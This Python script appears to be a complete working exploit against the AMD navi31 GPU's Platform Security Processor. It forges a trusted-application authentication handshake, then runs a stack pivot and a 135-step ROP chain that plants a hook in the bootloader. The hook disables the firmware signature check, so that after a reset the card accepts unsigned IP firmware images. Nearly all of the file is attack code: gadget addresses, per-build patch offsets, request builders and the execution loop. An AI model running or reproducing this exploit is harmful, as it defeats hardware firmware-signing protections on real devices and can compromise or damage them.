"""Wake and Break: navi31 PSP signature-check neuter.

    signed ASD .163 + GCP .77  ->  forged FE07/08/09 handshake
    ->  FE0C stack migration   ->  135 FE0A ROP actions (68 probes, 67 writes)
    ->  mode-1 reset           ->  GFX_CMD_ID_LOAD_IP_FW with unsigned images

identify.py names the --sos-build a card needs; a wrong choice is inert.
selftest.py checks the manifests and request builders offline. Any abort
means cold ATX before the next PSP request.

    python3 identify.py FLASH.bin
    python3 wakebreak.py [--sos-build c] 25=/tmp/fw_25_bad.bin
"""

import argparse
import hashlib
from pathlib import Path
from struct import pack_into, unpack_from

from Crypto.Cipher import AES
from Crypto.Hash import CMAC

import tinygrad.runtime.autogen.am.am as am
from tinygrad import Device

HERE = Path(__file__).resolve().parent
HOOK = HERE / "hook"

BUFFER_SIZE = 0x40000
FILL = 0xBB
RPC_SIZE = 0x40


def say(message=""):
    print(message, flush=True)


def cmac(key, message):
    return CMAC.new(key, msg=message, ciphermod=AES).digest()


# --- blobs and the fixed manifest, one entry per stock SPI build pair -------

# Host view of the retained BL copy in SRAM.
fabric = lambda cpu: 0x81042000 + cpu - 0x17500

# Per stock SPI build pair: the BL span the hook body is planted in, the
# installer's two caves, and the dwords that redirect into the tail. Only "a"
# is card-tested (see README); b/c/d have never run on hardware. A wrong
# choice installs nothing and the card boots stock.
PROFILES = {
    # BL 26565174 + sOS 8168d633, 12 navi31 ROMs
    "a": dict(stock="source_stock.bin", blob="", source=0x196C4, helper=0x1A070,
              tail=0x1A194, site=(0x1874C, 0x18750), sos_site=0x9B28,
              stock_site=(0xF7FF1000, 0x4620FA89), sos_cave=0x12CB8,
              patch_site=(0xF0011000, 0x4620FD21)),
    # same BL, sOS b8cb2d7d = a shifted +0x20, 3 ROMs
    "b": dict(stock="source_stock.bin", blob="_sosb", source=0x196C4, helper=0x1A070,
              tail=0x1A194, site=(0x1874C, 0x18750), sos_site=0x9B48,
              stock_site=(0xF7FF1000, 0x4620FA89), sos_cave=0x12CD8,
              patch_site=(0xF0011000, 0x4620FD21)),
    # BL 294ec7b1 + sOS f796ac5e, 21 ROMs. Hooked BL is a halfword earlier and
    # dword-aligned, so site dword 2 is rewritten with its own stock value.
    "c": dict(stock="source_stock_sosc.bin", blob="_sosc", source=0x1968C, helper=0x1A024,
              tail=0x1A134, site=(0x1874C, 0x18750), sos_site=0x99AC,
              stock_site=(0xFA8AF7FF, 0xF7FF4620), sos_cave=0x12AB8,
              patch_site=(0xFCF2F001, 0xF7FF4620)),
    # BL 46f0c343 + sOS 7b395f4d, 3 ROMs
    "d": dict(stock="source_stock_sosd.bin", blob="_sosd", source=0x19780, helper=0x1A104,
              tail=0x1A1A4, site=(0x187B8, 0x187BC), sos_site=0x9C80,
              stock_site=(0xF7FF1000, 0x4620FA53), sos_cave=0x132A4,
              patch_site=(0xF0011000, 0x4620FCF3)),
}

# Preimages cut from each build's own bootloader image.
STOCK_SHAS = {
    "source_stock.bin": "81cfb49dd6289a4b4b9fb1f5f2e5c45a0240e582e121870e996b4a1b1e71d666",
    "source_stock_sosc.bin": "858cbd1d20026871da0347112dc9c166e388e900989813eb9fdd1e4dd0196331",
    "source_stock_sosd.bin": "aa0eaa6002659d5f2efbb0467b091d6eacacecb15d39068d7735af3726708466",
}

ENTRY = (0x81042000, 0xEA00000C, 0xEA00000C)


class Profile:
    """One stock SPI build pair: its blobs and the 135-action manifest."""

    def __init__(self, name):
        if name not in PROFILES:
            raise SystemExit(f"--sos-build must be one of {', '.join(PROFILES)}")
        p = PROFILES[name]
        self.name = name
        self.source_cpu, self.helper_cpu, self.tail_cpu = p["source"], p["helper"], p["tail"]
        self.site, self.stock_site = p["site"], p["stock_site"]
        self.patch_site = p["patch_site"]
        self.stock = (HOOK / p["stock"]).read_bytes()
        # The hook body is the whole patch: it neuters the SYS_DRV signature
        # verdict for LOAD_IP_FW images as well as TAs. Nothing else is
        # installed and nothing is staged at boot.
        self.source = (HOOK / f"source_ipfw{p['blob']}.bin").read_bytes()
        installer = (HOOK / f"installer{p['blob']}.bin").read_bytes()
        gap = self.tail_cpu - self.helper_cpu
        self.helper, self.tail = installer[:32], installer[gap : gap + 44]

        assert hashlib.sha256(self.stock).hexdigest() == STOCK_SHAS[p["stock"]], (
            f"hook/{p['stock']} is not the stock BL span at CPU {self.source_cpu:#x}"
        )
        assert len(self.stock) == len(self.source) == 184, "the plant writes 46 dwords"
        assert len(self.helper) == 32 and len(self.tail) == 44, "installer is short"
        assert self.helper[14:16] == bytes((len(self.source), 0x22)), (
            "the helper's `movs r2,#184` copy length does not match the hook blob"
        )
        # Generation binding: a blob built for another profile cannot pass.
        assert unpack_from("<4I", self.tail, 24) == (
            p["sos_site"], 0xF0074620, p["sos_cave"], self.source_cpu
        ), f"installer{p['blob']}.bin was not built for sos-build {name}"

    def targets(self):
        """(fabric address, stock word, planted word) for all 67 writes."""
        out = []
        for i, (old, new) in enumerate(
            zip(unpack_from("<46I", self.stock, 0), unpack_from("<46I", self.source, 0))
        ):
            out.append((fabric(self.source_cpu) + 4 * i, old, new))
        for i, word in enumerate(unpack_from("<8I", self.helper, 0)):
            out.append((fabric(self.helper_cpu) + 4 * i, 0, word))
        for i, word in enumerate(unpack_from("<11I", self.tail, 0)):
            out.append((fabric(self.tail_cpu) + 4 * i, 0, word))
        for site, stock, patch in zip(self.site, self.stock_site, self.patch_site):
            out.append((fabric(site), stock, patch))
        return tuple(out)

    def actions(self):
        """68 width-0 preimage probes, then 67 width-4 writes. Redirects last."""
        every = (ENTRY,) + self.targets()
        probes = tuple((a, planted, 0, stock) for a, stock, planted in every)
        writes = tuple((a, planted, 4, planted) for a, _, planted in self.targets())
        return probes + writes



# --- GCP .77 request builders -----------------------------------------------

PARAMS_VA = 0x04024000
STACK_DST = 0x00410000
PC_SLOT = 0x0041BFBC
SCRATCH = 0x16C
SELECTOR = 0x81000088


def displacement(dest, bias=0x418):
    return (dest - PARAMS_VA - bias) & 0xFFFFFFFF


def rpc(opcode, **named):
    """The 0x40-byte little-endian wire message (opcode, then a1..a15)."""
    out = bytearray(RPC_SIZE)
    pack_into("<I", out, 0, opcode)
    for name, value in named.items():
        pack_into("<I", out, 4 * int(name[1:]), value)
    return bytes(out)


def _auth_request(opcode, handle, fill=0xA5):
    b = bytearray([fill]) * BUFFER_SIZE
    pack_into("<I", b, 0, opcode)
    pack_into("<I", b, 0x10, handle)
    pack_into("<I", b, 0x414, 0xFFFFFFFB)
    pack_into("<I", b, 0x818, 0x1000)
    return b


def fe07_open():
    return bytes(_auth_request(0xFE07, 0))


def fe08_auth(handle, ciphertext):
    b = _auth_request(0xFE08, handle)
    b[0x14 : 0x14 + len(ciphertext)] = ciphertext
    return bytes(b)


def fe09_authenticated_seed(handle, seed, mac, seed_offset):
    data = seed.to_bytes(4, "little") + bytes(range(4, 0x20))
    b = _auth_request(0xFE09, handle)
    b[0x14:0x24] = mac
    b[0x24:0x44] = data
    for off, value in ((0x414, 0x10 + len(data)), (0x820, 1), (0x828, 0xE8),
                       (0x82C, seed_offset), (0x830, 0)):
        pack_into("<I", b, off, value)
    return bytes(b)


def fe0a_codeword_probe(handle, target, input_len=0xFFFFFFFF, selector=11):
    b = bytearray([FILL]) * BUFFER_SIZE
    for off, value in ((0, 0xFE0A), (0x10, handle), (0x14, 0x11111111),
                       (0x414, input_len), (0x818, 0x1000), (0x820, selector),
                       (0x824, displacement(target, bias=0x14)), (0x828, 0)):
        pack_into("<I", b, off, value)
    return bytes(b)


def fe0c_migration(pivot=0x40371D, fill=0xA5):
    b = bytearray([fill]) * BUFFER_SIZE
    pack_into("<I", b, 0, 0xFE0C)
    pack_into("<Q", b, 0x10, PARAMS_VA + 0x2000)
    pack_into("<Q", b, 0x18, pivot << 32)
    pack_into("<I", b, 0x414, 0x1000)
    pack_into("<I", b, 0x818, 0x1000)
    return bytes(b)


# --- the five-call ROP chain -------------------------------------------------

MESSAGE_OFFSETS = (0x500, 0x600, 0x700, 0x800, 0x900)
SOURCE_OFF, ROP_FRAME, GRACE = 0x2200, 0x2000, 0x3B0
SETARGS, MEMCPY, SVC_F2 = 0x40167F, 0x40410B, 0x4061CB
EXFIL, PIVOT, STRB, SETR0 = 0x40404F, 0x40371D, 0x402267, 0x405F79
RESULT_OFF, RESULT_LEN, STATUS_OFF = 0x3000, 0x450, 8


def five_call(handle, address, value, write):
    """One 0x40000-byte FE0A selector-4 request: read selector, two topology
    descriptors that allowlist `address`, the 0x403 write, then read it back.
    Offsets are the proven .77 template; do not rearrange."""
    desc0, desc1, entry = (STACK_DST + o for o in (0xA00, 0xA40, 0xA80))
    messages = (
        rpc(0x404, a1=4 << 8, a2=SELECTOR, a5=4),
        rpc(0x100, a1=0, a2=desc0),
        rpc(0x100, a1=1, a2=desc1),
        rpc(0x403, a1=82 | 4 << 8, a2=address, a3=value, a4=0, a5=4 if write else 0),
        rpc(0x404, a1=4 << 8, a2=address, a5=4),
    )
    b = bytearray([FILL]) * BUFFER_SIZE

    def w(offset, val):
        pack_into("<I", b, offset, val)

    def s(offset, val):
        pack_into("<I", b, SOURCE_OFF + offset, val)

    dst = lambda offset: STACK_DST + offset
    o = ROP_FRAME
    # Entry command and chosen-write displacement.
    for off, val in ((0, 0xFE0A), (0x10, handle), (0x14, 0x11111111), (0x414, 0x1000),
                     (0x818, 0xFFFFFFF0), (0x81C, 0x40), (0x820, 4), (0x824, 0),
                     (0x828, 0), (0x838, displacement(PC_SLOT - 4)), (0x83C, 0x200),
                     (0x840, displacement(PC_SLOT - 0x1C))):
        w(off, val)
    pack_into("<Q", b, 0x214, 0)
    # ROP frame and signed memcpy to the GCP-owned migrated stack.
    for k in range(0, 0x20, 4):
        w(o + k, 0)
    for off, val in ((0x20, SETARGS), (0x24, STACK_DST),
                     (0x28, PARAMS_VA + SOURCE_OFF), (0x2C, 0xC00)):
        w(o + off, val)
    for k in range(0x30, 0x58, 4):
        w(o + k, 0)
    w(o + 0x58, MEMCPY)
    for off, val in ((0x84, STACK_DST), (0x88, 0), (0x8C, 0), (0x90, PIVOT)):
        w(o + off, val)
    for k in range(0, GRACE, 4):
        s(k, 0)
    # First four calls: SETARGS -> SVC F2; slots are 0x60 apart.
    for i, off in enumerate(MESSAGE_OFFSETS[:4]):
        p = 0x20 + 0x60 * i
        for x, val in ((p, SETARGS), (p + 4, 2), (p + 8, dst(off)), (p + 0x38, SVC_F2)):
            s(x, val)
        if i < 3:
            s(p + 0x60, SETARGS)
    # Capture the fourth status, invoke the fifth, capture its status.
    for off, val in ((0x19C, PARAMS_VA + 0x3000), (0x1A0, EXFIL), (0x230, SETARGS),
                     (0x234, 2), (0x238, dst(MESSAGE_OFFSETS[4])), (0x268, SVC_F2),
                     (0x28C, PARAMS_VA + 0x3004), (0x290, EXFIL), (0x320, SETARGS),
                     (0x324, PARAMS_VA + 0x3010), (0x328, dst(MESSAGE_OFFSETS[0])),
                     (0x32C, 0x440), (0x358, MEMCPY), (0x384, dst(GRACE)),
                     (0x390, PIVOT)):
        s(off, val)
    # Grace marker and bytewise return-slot restoration.
    for off, val in ((0, 0x5A), (4, PARAMS_VA + 0x3100), (0x20, STRB)):
        s(GRACE + off, val)
    for k in (8, 0xC, 0x10, 0x14, 0x18, 0x1C):
        s(GRACE + k, 0)
    for off, byte in ((0x24, 0x8D), (0x3C, 0x49), (0x54, 0x40), (0x6C, 0)):
        s(GRACE + off, byte)
        s(GRACE + off + 4, PC_SLOT + (off - 0x24) // 0x18)
        for k in (8, 12, 16):
            s(GRACE + off + k, 0)
        s(GRACE + off + 20, STRB)
    s(GRACE + 0x84, PC_SLOT - 0x20)
    for k in (0x88, 0x8C, 0x90, 0x94):
        s(GRACE + k, 0)
    for off, val in ((0x98, SETR0), (0x9C, 0x240), (0xA0, 0), (0xA4, 0), (0xA8, PIVOT)):
        s(GRACE + off, val)
    # Clear descriptor/entry, then the ASD .163 allowlist entry for `address`.
    for k in range(0xA00, 0xA80 + 0x40, 4):
        s(k, 0)
    s(0xA40 + 0xC, entry)
    s(0xA80, 4)
    s(0xA80 + 8, address)
    for off, message in zip(MESSAGE_OFFSETS, messages):
        start = SOURCE_OFF + off
        b[start : start + RPC_SIZE] = message
    return bytes(b)


def dumped_rpc(reply, number):
    """Post-call RPC wire bytes copied to FE0A output; number is 1..5."""
    offset = 0x3010 + 0x100 * (number - 1)
    return bytes(reply[offset : offset + RPC_SIZE])



# --- plant stage -------------------------------------------------------------


def run_exploit(prof):
    steps = prof.actions()
    assert len(steps) == 135, f"manifest is {len(steps)} actions, expected 135"
    say(f"plant: sos-build {prof.name}, {len(steps)} actions (68 probes, 67 writes)")

    adev = Device["AMD"].iface.dev_impl
    psp = adev.psp
    responsive = True
    sid = None

    # FE08 credential: an AES-128 key of our choosing, RSA-wrapped to the GCP
    # leaf certificate in the TA. The assert below proves it still MACs the
    # known seed-1 block before any card request.
    ct = bytes.fromhex(
        "9dd5369b6bc6585c4e6a36ff0f58c49bde116f5f6a83d2fc9362fab7890e10d85a7f777f2686f5e433cf455b4deb8271396e812175d33ed0ce9f1850417790ac"
        "9c9ecd22d675c6f68e46970600836deb031d6396c8266a787aaef7dee282aaf52cfca48fb3b1cebd713c263d5088f8ed9b0cb4ed684be24338eb35cb5b1309f3"
        "f1c7ecba92214fa00e68a87f669005099228753d2a011cac3e811d278883eaafc10c29195bd3c44c58aee24c48aac62a44f51fac9d7c4cc986f89e982a1a087d"
        "84e3f48a7ba2aa6cb07586a63dea76da77fe2f06b30cda3ebfafdbf99eb2d42d3fc152966d3ada09526aadd438305a33cb81422e62ee1d7e61b96ac627c3b246"
    )
    sk = bytes.fromhex("00112233445566778899aabbccddeeff")
    seed_offset = 16
    assert (
        cmac(sk, bytes([1, 0, 0, 0]) + bytes(range(4, 0x20))).hex()
        == "08cfc439fbf1c68b241f23671caec026"
    )

    def alloc(n):
        pa = adev.mm.palloc(n, align=0x1000, zero=True, boot=False)
        return pa, adev.paddr2mc(pa)

    def load(blob, kind, app_pa, app_mc, cmd_mc, cmdlen):
        nonlocal responsive
        n = (len(blob) + 3) & ~3
        adev.vram.view(app_pa, n)[:] = blob + bytes(n - len(blob))
        adev.gmc.flush_hdp()
        cmd = am.struct_psp_gfx_cmd_resp(cmd_id=kind)
        t = cmd.cmd.cmd_load_ta
        t.app_phy_addr_lo, t.app_phy_addr_hi = app_mc & 0xFFFFFFFF, app_mc >> 32
        t.app_len = len(blob)
        t.cmd_buf_phy_addr_lo, t.cmd_buf_phy_addr_hi = cmd_mc & 0xFFFFFFFF, cmd_mc >> 32
        t.cmd_buf_len = cmdlen
        responsive = False
        r = psp._ring_submit(cmd)
        responsive = (r.resp.status & 0xFFFFFFFF) == 0
        return r.resp.status & 0xFFFFFFFF, r.resp.session_id

    # The proven ASD-first, GCP-SID1 allocations.
    app, app_mc = alloc(0x80000)
    command, command_mc = alloc(BUFFER_SIZE)
    asd_app, asd_app_mc = alloc(0x80000)
    asd_cmd, asd_cmd_mc = alloc(0x10000)
    firmware = HERE / "firmware"
    asd_blob = (firmware / "asd_33-0-0-163_18debcc4.bin").read_bytes()
    gcp_blob = (firmware / "ta_22-0-0-77_7c426e7f.bin").read_bytes()

    # Replies only need the status word and the result/grace/dump window.
    # Every request is uploaded whole rather than diffed against a host shadow:
    # same bytes on the card, far less bookkeeping. 135 x 0x40000 still runs in
    # well under a minute, including over tinygrad's USB bridge.
    ROP_READS = ((4, 8), (RESULT_OFF, RESULT_LEN))

    def invoke(opcode, request, reads=None):
        nonlocal responsive
        assert len(request) == BUFFER_SIZE, "wrong command-buffer size"
        adev.vram.view(command, BUFFER_SIZE)[:] = request
        adev.gmc.flush_hdp()
        cmd = am.struct_psp_gfx_cmd_resp(cmd_id=am.GFX_CMD_ID_INVOKE_CMD)
        cmd.cmd.cmd_invoke_cmd.session_id = sid
        cmd.cmd.cmd_invoke_cmd.ta_cmd_id = opcode
        responsive = False
        r = psp._ring_submit(cmd)
        ring = r.resp.status & 0xFFFFFFFF
        responsive = ring == 0
        adev.gmc.flush_hdp()
        if reads is None:
            out = bytes(adev.vram.view(command, BUFFER_SIZE)[:])
            return ring, unpack_from("<I", out, STATUS_OFF)[0], out
        reply = bytearray(RESULT_OFF + RESULT_LEN)
        for off, size in reads:
            reply[off : off + size] = bytes(adev.vram.view(command + off, size)[:])
        return ring, unpack_from("<I", reply, STATUS_OFF)[0], bytes(reply)

    def checked(opcode, request, expected=0):
        ring, ta, data = invoke(opcode, request)
        if ring != 0 or ta != expected:
            raise RuntimeError(
                f"signed gate {opcode:#x} did not match expected {expected:#x}"
            )
        return data

    def handle():
        response = checked(0xFE07, fe07_open())
        value = unpack_from("<I", response, 0x1950)[0]
        if not value:
            raise RuntimeError("FE07 returned zero handle")
        return value

    def authorize(h, seed):
        checked(0xFE08, fe08_auth(h, ct))
        data = seed.to_bytes(4, "little") + bytes(range(4, 0x20))
        checked(0xFE09, fe09_authenticated_seed(h, seed, cmac(sk, data), seed_offset))

    try:
        asd_st, _ = load(asd_blob, am.GFX_CMD_ID_LOAD_ASD, asd_app, asd_app_mc,
                         asd_cmd_mc, 0x10000)
        if asd_st != 0:
            raise RuntimeError(f"ASD load failed, status {asd_st:#x}")
        gcp_st, sid = load(gcp_blob, am.GFX_CMD_ID_LOAD_TA, app, app_mc, command_mc,
                           BUFFER_SIZE)
        if gcp_st != 0 or sid != 1:
            raise RuntimeError(f"not the proven SID1 load order "
                               f"(status {gcp_st:#x}, sid {sid})")
        say(f"[1/4] signed ASD + GCP TA loaded, session {sid}")

        # Rejects the original SID2 source-VA failure before building the ROP.
        for seed, expected in ((0x4604A121, 0x241), (0x4604A122, 0x100)):
            h = handle()
            authorize(h, seed)
            checked(0xFE0A, fe0a_codeword_probe(h, 0x404A78), expected)

        if adev.rreg(0x582CC // 4) & 0xFFFFFFFF != 0x80000000:
            raise RuntimeError("host MP0 control changed; no write request")

        h = handle()
        checked(0xFE0C, fe0c_migration())
        authorize(h, 1)
        say(f"[2/4] handshake forged, codeword gates passed, handle {h:#x}")

        for index, (address, value, width, observed_after) in enumerate(steps, 1):
            if width == 4 and index <= 68:
                raise AssertionError("BL plant before complete preimage sweep")
            scratch_before = adev.rreg(SCRATCH // 4) & 0xFFFFFFFF
            mp0_before = adev.rreg(0x582CC // 4) & 0xFFFFFFFF
            if (scratch_before, mp0_before) != (0, 0x80000000):
                raise RuntimeError("host scratch/MP0 changed BEFORE request; STOP")
            kind = "probe" if width == 0 else "write"
            request = bytearray(five_call(h, address, value, width == 4))
            pack_into("<I", request, 0x14, 0x11111111 + index - 1)
            ring, status, reply = invoke(0xFE0A, bytes(request), ROP_READS)
            if ring != 0:
                raise RuntimeError("PSP ring failed; STOP, no completion inference")
            grace = reply[0x3100]
            fourth, fifth = unpack_from("<II", reply, RESULT_OFF)
            frames = tuple(getattr(adev, f"mmMP0_SMN_C2PMSG_{n}").read() & 0xFFFFFFFF
                           for n in range(82, 89))
            selector_asd = unpack_from("<I", dumped_rpc(reply, 1), 0xC)[0]
            target_asd = unpack_from("<I", dumped_rpc(reply, 5), 0xC)[0]
            scratch_after = adev.rreg(SCRATCH // 4) & 0xFFFFFFFF
            mp0_after = adev.rreg(0x582CC // 4) & 0xFFFFFFFF
            if (status != 0x240 or grace != 0x5A or any(frames) or fifth != 0
                    or (scratch_before, selector_asd, scratch_after) != (0, 1, 0)
                    or (mp0_before, mp0_after) != (0x80000000,) * 2
                    or fourth != (2 if width == 0 else 0)
                    or target_asd != observed_after):
                say(f"action {index} ({kind} {address:#010x}): status {status:#x} "
                    f"grace {grace:#x} 0x403/0x404 {fourth:#x}/{fifth:#x} "
                    f"readback {target_asd:#010x} fault "
                    f"{' '.join(f'{x:08x}' for x in frames)}")
                if width == 0 and target_asd != observed_after:
                    say(f"preimage mismatch at {address:#010x}: expected "
                        f"{observed_after:#010x}, card holds {target_asd:#010x}. This "
                        f"card does not carry sos-build {prof.name}; nothing was "
                        "written. Run identify.py on a flash dump, or just try "
                        "another --sos-build.")
                raise RuntimeError(f"action {index} failed target/health gate; STOP")
            if index % 25 == 0:
                say(f"  {index}/{len(steps)} actions read back")
        checked(0xFE07, fe07_open())
        say("[3/4] planted: 68 preimages verified, 67 words written and read back")
        return adev
    except BaseException as exc:
        say(f"STOP: {type(exc).__name__}: {exc}")
        say("cold ATX power cycle before any further PSP request")
        raise
    finally:
        if sid and responsive:
            try:
                cmd = am.struct_psp_gfx_cmd_resp(cmd_id=am.GFX_CMD_ID_UNLOAD_TA)
                cmd.cmd.cmd_unload_ta.session_id = sid
                psp._ring_submit(cmd)
            except Exception as exc:
                say(f"GCP unload failed ({type(exc).__name__}); cold ATX needed")
        elif sid:
            say("PSP ring not confirmed responsive: no unload; cold ATX needed")


# --- session stage: one mode-1 boot, then LOAD_IP_FW -------------------------


def boot(adev):
    """Mode-1 reset, then the full-boot arm of AMDev.__init__ re-run against
    the live object. The PSP reloads its components on the way up, which is
    when the planted bootloader hook fires."""
    from tinygrad.runtime.autogen import pci
    from tinygrad.runtime.support.am.ip import AM_PSP, AM_SMU

    original_reset = AM_SMU.mode1_reset
    resets = [0]

    def reset(self):
        resets[0] += 1
        if (resets[0] != 1 or self.adev.rreg(0x16C // 4) != 0
                or self.adev.rreg(0x582CC // 4) != 0x80000000):
            raise RuntimeError("mode-1 precondition failed; cold ATX, no requests")
        return original_reset(self)

    # Hooked last: tinygrad may have reset the card while opening it, and that
    # one is stock, unhooked and must not spend our one shot.
    AM_SMU.mode1_reset = reset

    say("[4/4] mode-1 reset, loading sOS components")
    if not (adev.psp.is_sos_alive() and adev.smu.is_smu_alive()):
        raise RuntimeError("sOS or SMU not responding before reset; cold ATX")
    command = adev.pci_dev.read_config(pci.PCI_COMMAND, 2)
    adev.is_booting = True
    adev.pci_dev.write_config_flush(pci.PCI_COMMAND, command & ~pci.PCI_COMMAND_MASTER, 2)
    adev.smu.mode1_reset()
    adev.pci_dev.write_config_flush(pci.PCI_COMMAND, command | pci.PCI_COMMAND_MASTER, 2)
    adev.init_hw(adev.soc, adev.gmc, adev.ih, adev.psp, adev.smu)
    adev.is_booting = False
    adev.init_hw(adev.gfx, adev.sdma)
    adev.smu.set_clocks(level=-1)
    for ip in (adev.soc, adev.gfx):
        ip.set_clockgating_state()
    adev.reg("regSCRATCH_REG7").write(type(adev).Version)
    adev.reg("regSCRATCH_REG6").write(1)

    version = adev.mmMP0_SMN_C2PMSG_58.read() & 0xFFFFFFFF
    if (resets[0], adev.psp.is_sos_alive(), version) != (1, True, 0x00310036):
        raise RuntimeError("post-reset signed sOS/version gate failed; cold ATX")
    say(f"signed .54 sOS up: version {version:#010x}, healthy")
    return adev


def load_ip_fw(adev, requests):
    """Stock firmware rejects a signature-tampered image (0xffff3072 on the
    tested card); with the hook planted it is accepted with ring status 0, so
    SYS_DRV's signature check no longer decides. See ipfw_images.py for a test
    pair. A rejected LOAD_IP_FW wedges the PSP: cold ATX after every attempt."""
    for fw_type, path in requests:
        blob = bytearray(Path(path).read_bytes())
        say(f"LOAD_IP_FW type {fw_type} <- {path} ({len(blob)} bytes)")
        try:
            adev.psp._load_ip_fw_cmd([fw_type], memoryview(blob))
        except Exception as exc:
            say(f"  rejected: {type(exc).__name__}: {exc}")
            continue
        say("  accepted (ring status 0)")


def ip_fw_request(text):
    fw_type, _, path = text.partition("=")
    if not path or not Path(path).is_file():
        raise argparse.ArgumentTypeError("expected TYPE=PATH with an existing file")
    return int(fw_type, 0), path


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("images", nargs="*", type=ip_fw_request, metavar="TYPE=PATH",
                    help="submit this image as GFX_FW_TYPE TYPE after boot")
    ap.add_argument("--sos-build", choices=sorted(PROFILES), default="a",
                    help="which firmware build the card carries; see identify.py")
    args = ap.parse_args()
    prof = Profile(args.sos_build)
    say(f"wakebreak.py — navi31 PSP .54, sos-build {prof.name}, "
        f"patch {hashlib.sha256(prof.source).hexdigest()[:8]}")
    adev = run_exploit(prof)
    boot(adev)
    load_ip_fw(adev, args.images)
    say("done. The patch is not persistent: cold ATX restores stock.")


if __name__ == "__main__":
    main()
